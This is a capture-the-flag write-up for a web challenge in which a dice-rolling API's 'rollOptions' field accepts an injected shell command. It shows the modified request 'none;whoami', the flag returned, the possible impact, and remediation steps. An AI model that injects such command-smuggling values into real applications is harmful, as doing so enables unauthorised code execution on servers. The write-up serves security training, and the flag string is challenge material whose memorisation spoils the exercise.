# Diceforge — dice-001 — RCE

## Challenge Overview

* **Challenge Name:** Diceforge
* **Platform:** Bugforge
* **Category:** Web Security
* **Vulnerability:** Remote Code Execution (RCE)
* **Difficulty:** Easy
* **Target Endpoint:** `POST /api/roll`

## Description

Diceforge is a web-based dice-rolling application that allows users to select different dice types, including D4, D6, D8, D10, D12, D20, and D100. The application rolls the selected dice and calculates their combined total.

The challenge hint was **RCE**. The objective was to inspect the application's API requests and identify an unsafe input-handling behavior.

## Tools Used

* Burp Suite
* Web Browser
* Burp Repeater

## Methodology

### 1. Explore the Application

Opened the Diceforge web application and selected at least one die of each available type. Rolled the dice and observed the application's behavior.

The application sent a request to the following endpoint:

`POST /api/roll`

### 2. Intercept the API Request

Used Burp Suite's Proxy HTTP history to capture the request generated when rolling the dice.

The original request payload was:

```json
{
  "dice": [
    {"type": "d4", "count": 1},
    {"type": "d6", "count": 1},
    {"type": "d8", "count": 1},
    {"type": "d10", "count": 1},
    {"type": "d12", "count": 1},
    {"type": "d20", "count": 1},
    {"type": "d100", "count": 1}
  ],
  "rollOptions": "none"
}
```

The normal response contained the dice notation, individual results, subtotals, grand total, and timestamp.

### 3. Modify the Request

Sent the captured request to Burp Repeater and modified the `rollOptions` parameter by appending `;whoami`.

The modified payload was:

```json
{
  "dice": [
    {"type": "d4", "count": 1},
    {"type": "d6", "count": 1},
    {"type": "d8", "count": 1},
    {"type": "d10", "count": 1},
    {"type": "d12", "count": 1},
    {"type": "d20", "count": 1},
    {"type": "d100", "count": 1}
  ],
  "rollOptions": "none;whoami"
}
```

### 4. Analyze the Response

The server returned a successful response containing the normal dice results and an additional `output` field.

```json
{
  "output": "bug{DjW3KXvXMv8lOU6EI7su2kkilXljMi62}"
}
```

The unexpected output and flag indicated that the modified input triggered the challenge's intended behavior.

**Note:** The response supports the RCE hypothesis, but the exact server-side execution mechanism was not independently verified.

## Flag

```text
bug{DjW3KXvXMv8lOU6EI7su2kkilXljMi62}
```

## Vulnerability Analysis

The behavior suggests that the backend may be processing the user-controlled `rollOptions` parameter unsafely, potentially allowing command injection.

If the value is passed to a shell command without appropriate safeguards, an attacker may be able to execute unintended operating-system commands.

## Impact

Depending on the execution context and application privileges, successful command injection may allow an attacker to:

* Execute commands on the application server.
* Access sensitive files and application data.
* Retrieve environment variables or credentials.
* Compromise other resources accessible to the application process.

## Remediation

1. Avoid invoking operating-system shells with user-controlled input.
2. Use safe APIs and structured arguments instead of constructing shell command strings.
3. Validate `rollOptions` against a strict allowlist of supported values.
4. Reject unexpected delimiters and malformed input where they are not part of the accepted format.
5. Apply least-privilege permissions to the application process.
6. Avoid exposing command output, internal errors, or sensitive information in API responses.

## Conclusion

The Diceforge challenge was investigated by capturing and modifying the dice-roll API request with Burp Suite. Changing `rollOptions` from `none` to `none;whoami` caused the response to include an unexpected output field containing the challenge flag.

This behavior is consistent with an unsafe command-execution vulnerability and demonstrates the importance of validating user input and avoiding shell-based command construction.

**Challenge Status:** Solved